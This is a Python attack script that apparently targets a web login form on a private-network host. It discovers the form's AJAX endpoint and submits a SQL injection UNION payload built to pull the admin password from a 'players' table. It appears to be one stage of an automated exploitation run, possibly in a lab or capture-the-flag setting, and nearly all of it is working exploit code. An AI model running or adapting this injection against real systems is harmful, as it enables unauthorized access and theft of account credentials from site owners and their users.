import html.parser
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://192.168.2.3:80/"

class PageParser(html.parser.HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
        self.scripts = []
        self.in_script = False
        self.script_text = []

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag.lower() == "form":
            self.current_form = {"attrs": attrs, "inputs": []}
            self.forms.append(self.current_form)
        elif tag.lower() == "input" and self.current_form is not None:
            self.current_form["inputs"].append(attrs)
        elif tag.lower() == "script":
            self.in_script = True
            self.script_text = []

    def handle_endtag(self, tag):
        if tag.lower() == "form":
            self.current_form = None
        elif tag.lower() == "script" and self.in_script:
            self.scripts.append("".join(self.script_text))
            self.in_script = False
            self.script_text = []

    def handle_data(self, data):
        if self.in_script:
            self.script_text.append(data)


def request(url, data=None, method=None):
    req = urllib.request.Request(url, data=data, method=method)
    try:
        with urllib.request.urlopen(req, timeout=15) as response:
            body = response.read().decode("utf-8", errors="replace")
            return {"status": response.status, "headers": dict(response.headers.items()),
                    "body": body, "final_url": response.geturl(), "error": None}
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        return {"status": exc.code, "headers": dict(exc.headers.items()),
                "body": body, "final_url": exc.geturl(), "error": str(exc)}
    except Exception as exc:
        return {"status": None, "headers": {}, "body": "", "final_url": url,
                "error": repr(exc)}


def main():
    report = {"target": BASE, "stage": "inspect_live_form"}
    page = request(BASE)
    report["page_response"] = page
    if page["status"] is None or not (200 <= page["status"] < 300):
        report["result"] = "form_not_observed; targeted request not sent"
        print(json.dumps(report, ensure_ascii=False))
        return

    parser = PageParser()
    parser.feed(page["body"])
    form = next((f for f in parser.forms
                 if any(i.get("name") == "username" for i in f["inputs"])), None)
    scripts = "\n".join(parser.scripts)
    report["form"] = form
    report["form_script"] = scripts
    if form is None:
        report["result"] = "username_form_not_observed; targeted request not sent"
        print(json.dumps(report, ensure_ascii=False))
        return

    # Resolve the AJAX endpoint and HTTP method from the currently served script.
    endpoint_match = re.search(r"(?:url\s*:\s*|\$\.post\s*\()\s*['\"]([^'\"]+)['\"]", scripts, re.I)
    method_match = re.search(r"(?:type|method)\s*:\s*['\"](GET|POST)['\"]", scripts, re.I)
    post_shorthand = re.search(r"\$\.post\s*\(\s*['\"]([^'\"]+)['\"]", scripts, re.I)
    if post_shorthand:
        endpoint = post_shorthand.group(1)
        http_method = "POST"
    elif endpoint_match and method_match:
        endpoint = endpoint_match.group(1)
        http_method = method_match.group(1).upper()
    else:
        report["result"] = "form_endpoint_or_method_not_confirmed; targeted request not sent"
        print(json.dumps(report, ensure_ascii=False))
        return

    action = form["attrs"].get("action")
    if action:
        endpoint_url = urllib.parse.urljoin(BASE, action)
    else:
        endpoint_url = urllib.parse.urljoin(BASE, endpoint)
    username_field = next(i["name"] for i in form["inputs"] if i.get("name") == "username")
    # One-column UNION form, consistent with the previously observed marker response.
    payload = "nonexistent_user' UNION SELECT password FROM players WHERE username='admin'-- -"
    encoded = urllib.parse.urlencode({username_field: payload})
    if http_method == "GET":
        separator = "&" if urllib.parse.urlsplit(endpoint_url).query else "?"
        request_url = endpoint_url + separator + encoded
        request_data = None
    else:
        request_url = endpoint_url
        request_data = encoded.encode("ascii")

    result = request(request_url, data=request_data, method=http_method)
    report.update({
        "stage": "targeted_password_query",
        "request": {
            "method": http_method,
            "url": request_url,
            "content_type": "application/x-www-form-urlencoded" if request_data is not None else None,
            "form_field": username_field,
            "payload": payload,
            "encoded_body": encoded if request_data is not None else None,
            "read_only_query_intent": True
        },
        "response": result,
        "result": "response_captured; assess whether it unambiguously associates a value with admin"
    })
    print(json.dumps(report, ensure_ascii=False))

if __name__ == "__main__":
    main()

